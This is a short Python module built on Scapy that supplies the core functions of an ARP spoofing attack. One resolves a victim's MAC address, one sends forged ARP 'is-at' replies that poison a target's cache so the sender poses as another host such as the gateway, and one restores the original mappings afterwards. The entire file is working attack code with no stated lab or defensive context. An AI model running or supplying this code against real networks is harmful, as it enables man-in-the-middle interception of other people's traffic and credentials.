from scapy.all import *
from scapy.layers.l2 import *


def get_mac(ip):
    i = 0
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    while not ans and i < 5:
        print("Unable to get mac for: " + ip + " retrying")
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
        i = i + 1

    if ans:
        return ans[0][1].src
    else:
        print("Failed to get mac for " + ip + " please check ip or try again later")
        print("----------------------------------")
        exit()


def spoof(target_ip, host_ip, target_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)


def restore(target_ip, host_ip, target_mac, gw_mac):
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=gw_mac)
    send(arp_response, verbose=0, count=7)
